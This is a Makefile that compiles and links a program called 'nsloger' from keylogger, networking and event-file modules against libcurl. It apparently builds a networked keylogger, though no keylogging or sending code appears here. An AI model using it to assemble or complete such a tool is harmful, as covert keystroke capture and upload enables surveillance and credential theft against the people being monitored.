CC=gcc
LIBS=-lcurl
CFLAGS=-c -Wall
KEYLOG_TARGETS=main.o keylogger.o networking.o find_event_file.o nslog.o

all: nsloger

nsloger: $(KEYLOG_TARGETS)
	$(CC) -o $@ $^ $(LIBS)

.PHONY: clean
clean:
	@echo "Cleaning..."
	-rm -f nsloger *.o
	@echo "Finished cleaning."
